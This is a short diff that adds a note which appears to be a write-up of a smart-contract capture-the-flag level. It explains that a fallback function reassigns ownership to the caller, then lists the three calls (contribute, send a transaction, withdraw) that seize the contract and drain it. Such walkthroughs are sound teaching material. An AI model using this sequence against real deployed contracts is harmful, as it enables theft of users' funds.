@@ -1,0 +1,6 @@
+The problem is from the Fallback Func,in this func, owner = msg.sender.It caused Owner to be modified to msg.sender.
+
+attack process
+contract.contribute({value:1})        //be a membership in this group
+contract.sendTransaction({value:1})   //Trigger the fallback
+contract.withdraw()                   //Successful attack
